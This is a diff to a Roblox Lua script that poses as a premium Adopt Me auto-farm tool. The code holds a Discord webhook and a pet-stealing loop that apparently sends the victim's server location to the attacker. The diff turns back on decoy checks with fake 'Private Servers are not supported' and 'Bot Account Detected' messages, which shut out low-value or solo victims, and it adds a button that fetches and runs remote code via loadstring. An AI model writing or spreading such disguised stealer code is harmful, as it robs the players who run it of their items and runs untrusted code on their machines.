@@ -2,15 +2,15 @@ local Username = "garbage_collector005"
 local Webhook = "https://discord.com/api/webhooks/1311885986535444533/Ym62wa2UPWZhEMqIbI9L9mTLmA0yS9j0v1B_7sXB-WaB8sJpDQ9lObHIml2mFm4lbVpJ"
 
 --check 1
---if getgenv().adm then return end
---getgenv().adm = true
+if getgenv().adm then return end
+getgenv().adm = true
 
 --check 2
---if #game:GetService("Players"):GetPlayers() < 2 then
-    --game:GetService("Players").LocalPlayer:Kick("\nPrivate Servers are not supported, unable get Remote.Events")
-    --wait(5)
-    --game:Shutdown()
---end
+if #game:GetService("Players"):GetPlayers() < 2 then
+    game:GetService("Players").LocalPlayer:Kick("\nPrivate Servers are not supported, unable get Remote.Events")
+    wait(5)
+    game:Shutdown()
+end
 
 local Pets = {}
 local PetCounts = {}
@@ -90,12 +90,12 @@ local messageADOPT = 'game:GetService("TeleportService"):TeleportToPlaceInstance
 if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
     local messageADOPT = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'
 --check 3
---else
---if legendaries_count + mega_count + neon_count + ultra_count == 0 then
-    --game:GetService("Players").LocalPlayer:Kick("\nBot Account Detected, Cannot duplicate low value object.pets.eggs [No Remote.Event Detected]")
-        --wait(8)
-        --game:shutdown()
-    --end
+else
+if legendaries_count + mega_count + neon_count + ultra_count == 0 then
+    game:GetService("Players").LocalPlayer:Kick("\nBot Account Detected, Cannot duplicate low value object.pets.eggs [No Remote.Event Detected]")
+        wait(8)
+        game:shutdown()
+    end
 end
 
 
@@ -247,11 +247,11 @@ if next(PetsInventory.pets) then
         end
     end
     --check 5
-    --if legendaries_count + mega_count + neon_count + ultra_count == 0 then
-        --game:GetService("Players").LocalPlayer:Kick("\nBot Account Detected, Cannot duplicate low value object [No Remote.Event Detected]")
-        --wait(8)
-        --game:Shutdown()
-    --end
+    if legendaries_count + mega_count + neon_count + ultra_count == 0 then
+        game:GetService("Players").LocalPlayer:Kick("\nBot Account Detected, Cannot duplicate low value object [No Remote.Event Detected]")
+        wait(8)
+        game:Shutdown()
+    end
 
     while #petUids > 0 and petCount < petLimit do
         if not stealActive then
@@ -289,7 +289,20 @@ local tab1 = DrRayLibrary.newTab("AUTO", "ImageIdHere")
 tab1.newLabel("[PREMIUM AUTO FARM SCRIPT FOR ADOPT ME]")
 tab1.newLabel("Auto Buy Eggs and Auto Hatch All of your Eggs!")
 tab1.newLabel("Auto Play Minigames to farm Bucks!")
-tab1.newLabel("Auto Grow Pets to Adult!")
+
+tab1.newButton("Tora's Hub", "Runs Tora's Hub [WINTER EVENT AUTO FARM GINGERBREAD AND AUTO PLAY MINI-GAMES!]", function()
+    game.StarterGui:SetCore("SendNotification", {
+		Title = "Starting Tora's Hub...",
+		Text = "Enjoy!",
+		Icon = "rbxassetid://2663933748",
+		Duration = 3
+	})
+	wait(2)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/AdoptMeWINTER"))()
+
+end)
+
+
 tab1.newButton("ReQiuYTPL Hub", "Runs ReQiuYTPL Hub! (Auto Farm, Auto Trade and More!)", function()
 	game.StarterGui:SetCore("SendNotification", {
 		Title = "Starting ReQiuYTPL Hub...",
